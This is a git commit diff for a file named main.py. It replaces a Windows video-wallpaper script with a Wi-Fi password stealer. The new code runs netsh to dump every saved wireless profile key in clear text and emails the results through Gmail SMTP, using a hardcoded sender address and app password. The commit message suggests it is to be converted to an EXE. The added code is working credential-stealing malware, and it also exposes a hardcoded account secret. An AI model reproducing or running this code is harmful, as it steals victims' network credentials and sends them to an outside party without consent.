f2bf92df028e9ab5e1dbf91272bb945b0fe23e93
eroge-69 <erogexunamed@gmail.com>
2025-07-25 18:45:22 +0700

    Upload main.py via PY to EXE tool

--- python-files/main.py
+++ python-files/main.py
@@ -1,42 +1,55 @@
-import os
-import ctypes
-import win32gui
-import win32con
-import vlc
-import time
+import subprocess
+import subprocess as sp
+from xml.dom import minidom
+from time import sleep
+import platform as pf
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
-VIDEO_FILE = "wallpaper.mp4"
+def extract_wifi_password():
+    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('cp866').split('\n')
+    #print(profiles_data)
 
-def get_workerw():
-    progman = win32gui.FindWindow("Progman", None)
-    win32gui.SendMessageTimeout(progman, 0x052C, 0, 0, win32con.SMTO_NORMAL, 1000)
-    
-    def enum_windows_callback(hwnd, lparam):
-        p = win32gui.FindWindowEx(hwnd, 0, "SHELLDLL_DefView", None)
-        if p != 0:
-            lparam.append(win32gui.FindWindowEx(0, hwnd, "WorkerW", None))
-        return True
+    profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]
+    #print(profiles)
 
-    workerws = []
-    win32gui.EnumWindows(enum_windows_callback, workerws)
-    return workerws[0] if workerws else None
+    temp = []
 
-def set_video_wallpaper(video_path):
-    hwnd = get_workerw()
-    if hwnd:
-        os.environ["VLC_PLUGIN_PATH"] = r"C:\Program Files\VideoLAN\VLC\plugins"  # Update as needed
-        instance = vlc.Instance()
-        player = instance.media_player_new()
-        media = instance.media_new(video_path)
-        player.set_media(media)
-        player.set_hwnd(hwnd)
-        player.play()
-        time.sleep(1)  # Let the video load
-        while True:
-            if player.get_state() == vlc.State.Ended:
-                player.stop()
-                player.play()
-            time.sleep(1)
+    for profile in profiles:
+        profile_info = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear').decode('cp866').split('\n')
+        #print(profile_info)
+        try:
+            password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
+        except IndexError:
+            password = None
+        #print(f'Сеть: {profile}, Пароль: {password}')
 
-if __name__ == "__main__":
-    set_video_wallpaper(VIDEO_FILE)
+        temp.append(f'Сеть: {profile}, Пароль: {password}\n')
+
+    result = '=================\nПолученные данные\n=================\n'
+
+    result = result + ''.join(temp)
+    return result
+
+def send_mail():
+    sender = 'sender122135@gmail.com'
+    password = 'tira omxk ggfu vyeo'
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    message = extract_wifi_password()
+    msg = MIMEText(message)
+    try:
+        server.login(user=sender, password=password)
+        server.sendmail(sender, sender, msg=f'{msg}')
+        print('Сообщение доставлено! :)')
+    except:
+        print('Сообщение не доставлено :(')
+
+
+def main():
+    send_mail()
+
+if __name__ == '__main__':
+    main()
